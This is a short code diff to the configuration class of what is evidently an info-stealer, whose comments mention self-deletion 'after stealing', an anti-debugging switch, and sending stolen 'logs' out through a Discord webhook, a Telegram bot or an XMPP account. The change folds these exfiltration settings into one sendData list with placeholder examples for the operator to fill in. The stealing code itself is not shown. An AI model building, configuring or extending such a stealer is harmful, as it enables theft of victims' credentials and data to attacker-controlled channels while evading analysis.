@@ -5,11 +5,8 @@ class config:
     selfDestruct = False #deletes itself after stealing
     debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)
 
-    sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
-    # You can write your address for sending logs here
-    discordData = ["url of your WebHook","name of that WebHook"]
-    TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]
-    xmppData = ["jabberid","jabberpassword","jabberreceiver"]
+    sendData = [0,"","",""]# You can write your address for sending logs here
 
-
-    # do not change the value of the variables below
+    #example for Discord [0, "url of your WebHook", "name of that WebHook","null"]
+    #example for Telegram [1, "HTTPAPI that you got from botFather", "your chat ID","null"]
+    #example for XMPP/Jabber [2, "jabberid", "jabberpassword", "jabberreceiver"]
